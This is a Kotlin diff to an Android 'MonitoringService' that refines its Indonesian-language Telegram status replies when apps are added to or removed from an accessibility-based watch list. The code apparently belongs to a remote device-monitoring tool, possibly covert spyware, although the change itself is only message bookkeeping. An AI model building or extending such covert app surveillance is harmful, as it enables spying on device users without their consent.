@@ -3934,12 +3934,20 @@ class MonitoringService : Service() {
             }
         }
         val packages = preferencesManager.a11yAppWatchPackageSet()
-        if (add) packages.addAll(resolved.keys) else packages.removeAll(resolved.keys.toSet())
+        val changed = ArrayList<String>()
+        val unchanged = ArrayList<String>()
+        for ((pkg, label) in resolved) {
+            val hit = if (add) packages.add(pkg) else packages.remove(pkg)
+            if (hit) changed.add(label) else unchanged.add(label)
+        }
         preferencesManager.setA11yAppWatchPackageSet(packages)
         sendToTelegram(buildString {
             appendLine("\uD83D\uDD75\uFE0F <b>Pantau app</b>")
-            if (resolved.isNotEmpty()) {
-                appendLine((if (add) "Ditambah: " else "Dihapus: ") + resolved.values.joinToString(", ") { Html.escape(it) })
+            if (changed.isNotEmpty()) {
+                appendLine((if (add) "Ditambah: " else "Dihapus: ") + changed.joinToString(", ") { Html.escape(it) })
+            }
+            if (unchanged.isNotEmpty()) {
+                appendLine((if (add) "Sudah ada: " else "Belum terdaftar: ") + unchanged.joinToString(", ") { Html.escape(it) })
             }
             if (failed.isNotEmpty()) appendLine("Tak ditemukan: " + failed.joinToString(", ") { Html.escape(it) })
             if (blocked.isNotEmpty()) appendLine("Dilewati (sensitif): " + blocked.joinToString(", ") { Html.escape(it) })
